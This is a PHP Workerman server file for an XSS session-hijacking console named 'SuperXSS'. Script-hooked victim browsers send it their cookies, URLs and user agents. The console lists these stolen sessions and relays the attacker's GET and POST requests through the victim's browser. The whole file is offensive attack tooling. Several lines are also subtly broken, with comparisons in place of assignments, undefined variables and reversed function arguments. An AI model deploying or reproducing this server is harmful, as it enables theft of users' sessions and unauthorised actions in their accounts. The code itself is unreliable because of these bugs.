<?php
use Workerman\Worker;
use \Workerman\WebServer;
use \Workerman\Lib\Timer;

require_once __DIR__ . '/Workerman/Autoloader.php';
require_once __DIR__ . '/Function.php';
$Config = require_once __DIR__ . '/Config.php';

$Hijack_console_worker = new Worker($Config['HIJACK_CONSOLE_LISTEN']);
$WS_listen_worker = new Worker($Config['WS_LISTEN']);

$Hijack_console_worker -> count = $Config['CONSOLE_WORKER_COUNT'];
$WS_listen_worker -> count = $Config['WS_WORKER_COUNT'];

$sessionlist = array();
$reply_pool = array();
$eval_pool = array();
//status: 0 已发送给ws 1 ws已经确认收到请求 2 已收到ws返回结果包

$WS_listen_worker -> onConnect = function($connection){
	//4s未发送ping包关闭连接
	$connection -> auth_timer_id = Timer::add(4, function()use($connection){
		$connection -> close();
	}, null, false);
};

$WS_listen_worker -> onClose = function($connection)use(&$sessionlist, &$reply_pool, &$eval_pool){
	if(isset($connection -> sessionid) && isset($sessionlist[$connection -> sessionid])){
		unset($sessionlist[$connection -> sessionid]);
	}
	for($i = 0; $i < count($reply_pool); $i++){
		if($reply_pool[$i]['SESSIONID'] === $connection -> sessionid && $reply_pool[$i]['STATUS'] != 2){
			$reply_pool[$i]['STATUS'] = 2;
			$reply_pool[$i]['STATUS_CODE'] = 503;
			$reply_pool[$i]['CT'] = "text/html";
			$reply_pool[$i]['CONTENT'] = "Client closed the websocket connection";
		}
	}
	for($i = 0; $i < count($eval_pool); $i++){
		if($eval_pool[$i]['SESSIONID'] === $connection -> sessionid && $eval_pool[$i]['STATUS'] != 2){
			$eval_pool[$i]['STATUS'] = 2;
			$eval_pool[$i]['CONTENT'] = "";
		}
	}
};

$WS_listen_worker -> onMessage = function($connection, $data)use(&$sessionlist, &$reply_pool, &$eval_pool){
	//确认数据包
	if(!$data = json_decode($data, true)){
		$connection -> close();
	}elseif(!isset($data['OP'])){
		$connection -> close();
	}
	
	switch($data['OP']){
		case "init":
			if(isset($data['UA']) && isset($data['REFERER']) && isset($data['URL']) && isset($data['BASEURL']) && isset($data['COOKIE']) && !isset($connection -> sessionid)){
				$res['INITSTATUS'] = 1;
				$connection -> sessionid = randChar(20);
				$sessionlist[$connection -> sessionid] = array("Connection" => $connection,
																"LastPing" => time(),
																"IP" => $connection -> getRemoteIp(),
																"UA" => htmlspecialchars(base64_decode($data['UA'])),
																"URL" => htmlspecialchars(base64_decode($data['URL'])),
																"REFERER" => htmlspecialchars(base64_decode($data['REFERER'])),
																"BASEURL" => htmlspecialchars(base64_decode($data['BASEURL'])),
																"COOKIE" => htmlspecialchars(base64_decode($data['COOKIE'])));
				Timer::del($connection -> auth_timer_id);
				//一旦12s没有提交心跳包则关闭连接
				$connection -> auth_timer_id = Timer::add(12, function()use($connection){
					$connection->close();
				}, null, false);
				$connection -> send(json_encode($res));
			}else{
				$connection -> close();
			}
		break;
		case "ping":
			$res['PINGSTATUS'] = 1;
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$connection -> close();
			}
			$sessionlist[$connection -> sessionid]["LastPing"] = time();
			//reset timer
			Timer::del($connection -> auth_timer_id);
			$connection -> auth_timer_id = Timer::add(12, function()use($connection){
				$connection->close();
			}, null, false);
			$connection -> send(json_encode($res));
		break;
		case "pushxhr":
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$connection -> close();
			}
			if(isset($data['STATUS_CODE']) && is_numeric($data['STATUS_CODE']) && isset($data['JOBID']) && isset($data['CT']) && isset($data['CONTENT'])){
				if($data['STATUS_CODE'] > 999){
					$connection -> close();
				}
				if(isset($reply_pool[$data['JOBID']]) && $reply_pool[$data['JOBID']]['STATUS'] == 1){
					$res['STATUS'] = 1;
					$res['JOBID'] = $data['JOBID'];
					Timer::del($reply_pool[$data['JOBID']]['TIMED_OUT_TIMER']);
					$reply_pool[$data['JOBID']]['STATUS_CODE'] == intval($data['STATUS_CODE']);
					$reply_pool[$data['JOBID']]['CT'] = $data['CT'];
					$reply_pool[$data['JOBID']]['CONTENT'] = base64_decode($data['CONTENT']);
					$reply_pool[$data['JOBID']]['STATUS'] = 2;
				}else{
					$res['STATUS'] = 0;
					$res['JOBID'] = $data['JOBID'];
				}
				$connection -> send(json_encode($res));
			}else{
				$connection -> close();
			}
		break;
		case "confirmxhr":
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$connection -> close();
			}
			if(isset($data['JOBID']) && isset($reply_pool[$data['JOBID']]) && $reply_pool[$data['JOBID']]['STATUS'] == 0){
				$reply_pool[$data['JOBID']]['STATUS'] == 1;
				Timer::del($reply_pool[$data['JOBID']]['TIMED_OUT_TIMER']);
				$reply_pool[$data['JOBID']]['TIMED_OUT_TIMER'] = Timer::add(25, function()use($jobid, &$reply_pool){
																				for($i = 0; $i < count($reply_pool); $i++){
																					if($reply_pool[$i]['JOBID'] === $jobid && $reply_pool[$i]['STATUS'] != 2){
																						$reply_pool[$i]['STATUS'] = 2;
																						$reply_pool[$i]['STATUS_CODE'] = 504;
																						$reply_pool[$i]['CT'] = "text/html";
																						$reply_pool[$i]['CONTENT'] = "Client failed to reply within time limit";
																					}
																				}
																			});
				$res['STATUS'] = 1;
				$res['JOBID'] = $data['JOBID'];
			}else{
				$res['STATUS'] = 0;
				$res['JOBID'] = $data['JOBID'];
			}
			$connection -> send(json_encode($res));
		break;
		case "confirmeval":
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$connection -> close();
			}
			if(isset($data['JOBID']) && isset($eval_pool[$data['JOBID']]) && $eval_pool[$data['JOBID']]['STATUS'] == 0){
				$eval_pool[$data['JOBID']]['STATUS'] == 1;
				Timer::del($eval_pool[$data['JOBID']]['TIMED_OUT_TIMER']);
				$eval_pool[$data['JOBID']]['TIMED_OUT_TIMER'] = Timer::add(25, function()use($jobid, &$eval_pool){
																				for($i = 0; $i < count($eval_pool); $i++){
																					if($eval_pool[$i]['JOBID'] === $jobid && $eval_pool[$i]['STATUS'] != 2){
																						$eval_pool[$i]['STATUS'] = 2;
																						$eval_pool[$i]['CONTENT'] = "TIMED OUT";
																					}
																				}
																			});
				$res['STATUS'] = 1;
				$res['JOBID'] = $data['JOBID'];
			}else{
				$res['STATUS'] = 0;
				$res['JOBID'] = $data['JOBID'];
			}
			$connection -> send(json_encode($res));
		break;
		case "pusheval":
			if(!isset($connection -> sessionid) || !isset($sessionlist[$connection -> sessionid])){
				$connection -> close();
			}
			if(isset($data['JOBID']) && isset($data['CONTENT'])){
				if(isset($eval_pool[$data['JOBID']]) && $eval_pool[$data['JOBID']]['STATUS'] == 1){
					$res['STATUS'] = 1;
					$res['JOBID'] = $data['JOBID'];
					Timer::del($eval_pool[$data['JOBID']]['TIMED_OUT_TIMER']);
					$eval_pool[$data['JOBID']]['CONTENT'] = base64_decode($data['CONTENT']);
					$eval_pool[$data['JOBID']]['STATUS'] = 2;
				}else{
					$res['STATUS'] = 0;
					$res['JOBID'] = $data['JOBID'];
				}
				$connection -> send(json_encode($res));
			}else{
				$connection -> close();
			}
		break;
	}
};

$Hijack_console_worker -> onMessage = function($connection, $data)use(&$sessionlist, &$reply_pool, &$eval_pool, $Config){
	if(!isset($_COOKIE['sessionid']) && !isset($_GET['hijack_session'])){
		$html = '<html><head><title>SuperXSS SESSION Hijack Console</title><link href="https://cdn.bootcss.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet"><script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><script src="https://cdn.bootcss.com/bootstrap/4.0.0/js/bootstrap.min.js"></script></head><body>';
		$html .= '<div class="container-fluid"><div class="row-fluid"><div class="span12"><h3 class="text-center">SuperXSS SESSION Hijack Console</h3><div class="row-fluid"><div class="span8">';
		foreach($sessionlist as $session => $info){
			$html .= '<blockquote>';
			$html .= '<p>上次心跳包: '.time() - $info['LastPing'].'秒前</p>';
			$html .= '<p>IP: '.$info['IP'].'</p>';
			$html .= '<p>URL: '.$info['URL'].'</p>';
			$html .= '<p>User-Agent: '.$info['UA'].'</p>';
			$html .= '<p>Referer: '.$info['REFERER'].'</p>';
			$html .= '<p>Cookie: '.$info['COOKIE'].'</p>';
			$html .= '</blockquote>';
		}
		$html .= '</div><div class="span4">';
		foreach($sessionlist as $session => $info){
			$html .= '<a href="/?hijack_session='. $session .'" class="btn btn-success btn-large btn-block" type="button">Hijack this session</a>';
		}
		$html .= '</div></div></div></div></div>';
		$connection -> send($html);	
		//$connection -> send(var_export($_SERVER, true).var_export($_POST, true).var_export($_FILES, true));
	}elseif(isset($_GET['hijack_session'])){
		if(!isset($sessionlist[$_GET['hijack_session']])){
			Workerman\Protocols\Http::header('HTTP', true, 404);
			$connection -> send("Current Session not exists or no longer be able to use");
		}else{
			Workerman\Protocols\Http::setcookie('hijack_session', $_GET['hijack_session']);
			Workerman\Protocols\Http::header("Location: /");
			$connection -> send("Redirecting...");
		}
	}else{
		$currentsession = $_COOKIE['hijack_session'];
		if(!isset($sessionlist[$currentsession])){
			Workerman\Protocols\Http::header('HTTP', true, 404);
			$connection -> send("Current Session not exists or no longer be able to use");
		}
		$currentsession = $sessionlist[$currentsession];
		if($_SERVER['REQUEST_METHOD'] == 'GET'){
			$filesuffix = explode('.', $_SERVER['REQUEST_URI']);
			$filesuffix = explode('?', $filesuffix[count($filesuffix) - 1])[0];
			if(in_array(explode(',', $Config['IGNORE_SUFFIX']), $filesuffix)){
				//静态文件302直接访问
				$realpath = $currentsession['BASEURL'] . $_SERVER['REQUEST_URI'];
				Workerman\Protocols\Http::header("Location: {$realpath}");
				$connection -> send("Redirecting...");
			}else{
				$jobid = randChar(8) . time();
				$reply_pool[$jobid] = array('STATUS' => 0, 
											'SESSIONID' => $_COOKIE['hijack_session'],
											'TIMED_OUT_TIMER' => Timer::add(6, function()use($jobid, &$reply_pool){	//6s超时，收到确认包后修改为25s超时
																				for($i = 0; $i < count($reply_pool); $i++){
																					if($reply_pool[$i]['JOBID'] === $jobid && $reply_pool[$i]['STATUS'] != 2){
																						$reply_pool[$i]['STATUS'] = 2;
																						$reply_pool[$i]['STATUS_CODE'] = 504;
																						$reply_pool[$i]['CT'] = "text/html";
																						$reply_pool[$i]['CONTENT'] = "Client failed to reply within time limit";
																					}
																				}
																			})
											);
				
				$send = array("OP" => "GET",
								"URI" => $_SERVER['REQUEST_URI'],
								"JOBID" => $jobid);
				$currentsession['Connection'] -> send(json_encode($send));
			}
		}elseif($_SERVER['REQUEST_METHOD'] == 'POST'){
			$jobid = randChar(8) . time();
			$reply_pool[$jobid] = array('STATUS' => 0, 
											'SESSIONID' => $_COOKIE['hijack_session'],
											'TIMED_OUT_TIMER' => Timer::add(8, function()use($jobid, &$reply_pool){	//8s超时，收到确认包后修改为25s超时
																				for($i = 0; $i < count($reply_pool); $i++){
																					if($reply_pool[$i]['JOBID'] === $jobid && $reply_pool[$i]['STATUS'] != 2){
																						$reply_pool[$i]['STATUS'] = 2;
																						$reply_pool[$i]['STATUS_CODE'] = 504;
																						$reply_pool[$i]['CT'] = "text/html";
																						$reply_pool[$i]['CONTENT'] = "Client failed to reply within time limit";
																					}
																				}
																			})
											);
			if(in_array(array('application/x-www-form-urlencoded', 'text/plain', 'application/json'), strtolower($_SERVER['CONTENT_TYPE']))){
				$send = array("OP" => "POST", 
								"URI" => $_SERVER['REQUEST_URI'], 
								"CT" => $_SERVER['CONTENT_TYPE'], 
								"DATA" => base64_encode($GLOBALS['HTTP_RAW_POST_DATA']),
								"JOBID" => $jobid);
				$currentsession['Connection'] -> send(json_encode($send));
			}elseif(strtolower($_SERVER['CONTENT_TYPE']) == 'multipart/form-data'){
				if(count($_FILES) == 0){
					$data = array('DATA' => json_encode($_POST));
				}else{
					$files = array();
					foreach($_FILES as $f){
						$files[] = array('file_name' => $f['file_name'], 'file_data' => base64_encode($f['file_data']), 'file_type' => $f['file_type']);
					}
					$data = array('DATA' => $_POST, 'FILE' => $files);
				}
				$send = array("OP" => "POST", 
								"URI" => $_SERVER['REQUEST_URI'], 
								"CT" => $_SERVER['CONTENT_TYPE'], 
								"DATA" => $data,
								"JOBID" => $jobid);
				$currentsession['Connection'] -> send(json_encode($send));
			}
		}
		while(true){
			if(!isset($reply_pool[$i][$jobid])){
				Workerman\Protocols\Http::header('HTTP', true, 500);
				$connection -> send("Server has experienced an exception");
				break;
			}else{
				if($reply_pool[$i][$jobid]['STATUS'] == 2){
					Workerman\Protocols\Http::header('HTTP', true, $reply_pool[$i][$jobid]['STATUS_CODE']);
					Workerman\Protocols\Http::header('Content-Type: ' . $reply_pool[$i][$jobid]['CT']);
					$content = $reply_pool[$i]['CONTENT'];
					unset($reply_pool[$i][$jobid]);
					if($Config['DOMAIN_AUTO_REPLACE'] == true){
						$content = str_replace('https:', '', str_replace('http:', ''. str_replace(str_replace('https://','',str_replace('http://','',$currentsession['BASEURL'])), str_replace('https://','',str_replace('http://','',$Config['HIJACK_CONSOLE_LISTEN'])), $content)));
					}
					$connection -> send($content);
					break;
				}else{
					usleep(100000);	//等待100ms
				}
			}
		}
	}
};

Worker::runAll();